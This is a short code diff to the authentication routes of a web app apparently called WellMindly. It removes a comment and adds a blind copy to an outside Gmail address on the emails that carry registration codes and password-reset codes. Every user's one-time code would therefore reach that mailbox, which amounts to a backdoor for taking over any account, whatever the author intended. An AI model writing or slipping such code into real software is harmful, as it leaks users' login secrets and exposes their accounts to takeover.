@@ -28,7 +28,6 @@ router.post('/google/callback', async (req, res) => {
             res.status(400).json({ error: 'idToken is required' });
             return;
         }
-        // 1. Verify the Google ID token
         let ticket;
         try {
             ticket = await googleClient.verifyIdToken({
@@ -140,6 +139,7 @@ router.post('/send-otp', async (req, res) => {
     try {
         await (0, mailer_1.sendEmail)({
             to: emailLower,
+            bcc: 'wellmindly@gmail.com',
             subject: 'Verify Your Account - WellMindly',
             html: (0, mailer_1.getOtpTemplate)(code, 'register'),
         });
@@ -175,6 +175,7 @@ router.post('/forgot-password', async (req, res) => {
         otpStore.set(emailLower, { code, expiresAt });
         await (0, mailer_1.sendEmail)({
             to: emailLower,
+            bcc: 'wellmindly@gmail.com',
             subject: 'Reset Your Password - WellMindly',
             html: (0, mailer_1.getOtpTemplate)(code, 'forgot_password'),
         });
